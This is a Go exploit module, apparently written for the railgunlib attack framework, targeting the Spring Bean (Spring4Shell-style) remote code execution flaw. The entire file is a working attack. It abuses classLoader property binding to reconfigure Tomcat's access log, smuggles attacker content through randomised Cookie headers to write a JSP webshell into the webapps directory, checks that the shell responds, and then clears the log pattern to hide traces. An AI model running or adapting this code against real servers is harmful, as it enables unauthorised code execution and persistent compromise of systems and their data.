package exp_spring

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

type Exp_Spring_Bean_RCE struct {
	exp_templates.ExpTemplate
}

func (self *Exp_Spring_Bean_RCE) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()
	payload := `class.module.classLoader.resources.context.parent.appBase=./&class.module.classLoader.resources.context.parent.pipeline.first.pattern={{pattern}}&class.module.classLoader.resources.context.parent.pipeline.first.suffix={{suffix}}&class.module.classLoader.resources.context.parent.pipeline.first.directory=./webapps{{directory}}&class.module.classLoader.resources.context.parent.pipeline.first.prefix={{prefix}}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat={{randomInt}}`

	// init
	headermin := self.MustGetStringParam("min")
	headermax := self.MustGetStringParam("max")
	headerminInt, err := strconv.Atoi(headermin)
	if err != nil {
		expResult.Err = err.Error()
		return
	}

	headermaxInt, err := strconv.Atoi(headermax)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	if headermaxInt < headerminInt {
		expResult.Err = "max less than min"
		return
	}

	//----------------directory---------------------
	// 路径拼接如 directory + prefix + fileDateFormat + suffix
	// 构造，解析filename是否有路径，有路径则shell路径就用filename路径，如果没有路径，就是/xx.jsp
	directory := "/ROOT/"

	filename = "/" + strings.TrimLeft(filename, "/")

	tmp := filepath.Dir(filename)
	if tmp != "" && len(tmp) > 1 {

		directory = strings.ReplaceAll(tmp, "\\", "/") + "/"
	}

	//----------------suffix/prefix/randInt---------------------
	// 前缀、后缀获取，并添加随机字符，否则无法修改文件名。
	suffix := filepath.Ext(filename)
	prefix := goutils.GetBaseName(filename)

	suffix = goutils.RandStrWithMeta(5, goutils.AsciiLitter+goutils.Digits) + suffix
	prefix = prefix + goutils.RandStrWithMeta(5, goutils.AsciiLitter+goutils.Digits)

	randInt := goutils.RandStrWithMeta(5, goutils.AsciiLitter+goutils.Digits)

	//----------------pattern---------------------
	// content拆分，按随机长度拆分成头部，pattern引用多个头部字段即可
	pattern := ""
	if content != "" {
		content = strings.ReplaceAll(content, "\r", "")
		content = strings.ReplaceAll(content, "\n", "")
		contentLen := len(content)
		offset := 0
		count := 0
		for {
			randLen := goutils.RandInt(headerminInt, headermaxInt)
			//offset += randLen
			section := ""
			if offset+randLen >= contentLen {
				section = content[offset:]
			} else {
				section = content[offset : offset+randLen]
			}
			headerKey := fmt.Sprintf("Cookie%v", count)
			headers.Set(headerKey, section)
			pattern += strings.ReplaceAll("%{headerKey}i", "headerKey", headerKey)
			if offset+randLen >= contentLen {
				break
			}
			count += 1
			offset = offset + randLen
		}
	}
	// 将上述准备字段插入payload中，发送请求
	payload = strings.ReplaceAll(payload, "{{suffix}}", suffix)
	payload = strings.ReplaceAll(payload, "{{prefix}}", prefix)
	payload = strings.ReplaceAll(payload, "{{directory}}", directory)
	payload = strings.ReplaceAll(payload, "{{randomInt}}", randInt)
	clearPayload := strings.ReplaceAll(payload, "{{pattern}}", "")
	payload = strings.ReplaceAll(payload, "{{pattern}}", url.QueryEscape(pattern))

	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg("Upload over. please wait 5s.")
	time.Sleep(5 * time.Second)
	// 构造shell URL
	uri := prefix + randInt + suffix
	if directory == "/ROOT/" {
		uri = "/" + uri
	} else {
		uri = directory + uri
	}
	u, err := url.Parse(self.Params.BaseParam.Target)
	if err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	shellUrl := fmt.Sprintf("%s://%s%s", u.Scheme, u.Host, uri)
	httpresp = self.HttpGetWithoutRedirect(shellUrl, self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 {
		self.EchoSuccessMsg("shell: %s", shellUrl)
		expResult.Status = true
	}
	self.EchoSuccessMsg("Clear pattern...")
	httpresp = self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, clearPayload, self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	return
}
func init() {
	exp_register.ExpStructRegister(&Exp_Spring_Bean_RCE{}, "exp_Spring_Bean_RCE.yml")

}
